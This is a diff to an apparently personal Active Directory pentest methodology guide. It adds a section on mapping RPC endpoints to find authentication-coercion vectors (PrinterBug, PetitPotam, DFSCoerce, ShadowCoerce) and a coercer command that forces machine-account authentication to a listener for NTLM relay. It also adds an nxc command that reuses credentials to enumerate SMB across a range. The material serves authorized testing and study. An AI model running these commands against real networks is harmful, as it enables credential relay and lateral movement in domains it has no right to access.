@@ -150,6 +150,32 @@ enum4linux -U <dc-ip> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
 
 > **SMB anonymous restricted ≠ SMB guest restricted.** If null-session SMB comes back empty, try guest before giving up: `nxc smb <ip> -u 'guest' -p ''` and `smbclient -L //<ip>/ -U 'guest%'`. Guest is a separate authenticator and admins often forget to disable it.
 
+### RPC Endpoint Mapping & Auth-Coercion Surface
+
+Map the RPC endpoints on a target to spot auth-coercion primitives — the interfaces that let you force a machine account to authenticate to a host you control, then relay it (`ntlmrelayx`) to LDAP, SMB, or AD CS.
+
+```bash
+impacket-rpcdump <ip>
+```
+
+Match the interface UUIDs in the output against the known coercion vectors:
+
+| Interface | UUID (prefix) | Coercion technique |
+|-----------|---------------|--------------------|
+| **MS-RPRN** (Print System Remote) | `12345678-1234-abcd-ef00-0123456789ab` | **PrinterBug** — coerce via `SpoolSample` / `printerbug.py` |
+| **MS-EFSR** (Encrypting File System Remote) | `c681d488-...` / `df1941c5-...` | **PetitPotam** |
+| **MS-DFSNM** (DFS Namespace Mgmt) | `4fc742e0-4a10-11cf-8273-00aa004ae673` | **DFSCoerce** |
+| **MS-FSRVP** (File Server VSS) | `a8e0653c-2744-4389-a61d-7373df8b2292` | **ShadowCoerce** |
+| **MS-TSCH / ATSVC / MS-EVEN** | — | Occasional coercion vectors — `coercer` tests these too |
+
+Let `coercer` probe all of them at once instead of checking UUIDs by hand:
+
+```bash
+coercer coerce -l <listener-ip> -t <target-ip> -u <user> -p <pass> -d <domain>
+```
+
+Any hit → stand up `ntlmrelayx` and relay the coerced machine-account auth. See [AD Initial Access](../3-exploitation/05-ad-initial-access.md) for the relay side.
+
 ### Getting That First User (Kerbrute)
 
 Stealthier than SMB / LDAP probing — uses Kerberos pre-auth packets.
@@ -190,6 +216,12 @@ nxc mssql <range> -u '<user>' -p '<pass>' --continue-on-success
 ```
 
 Any `[+]` result on a host you weren't already on = free pivot.
+
+Then re-run full SMB enumeration with *every* new credential — a set that was low-value on one host is often admin on another, and each cred can unlock users/shares the last one couldn't see:
+
+```bash
+nxc smb <range> -u '<user>' -p '<pass>' --users --shares --groups --pass-pol --loggedon-users
+```
 
 #### List and read every share
 
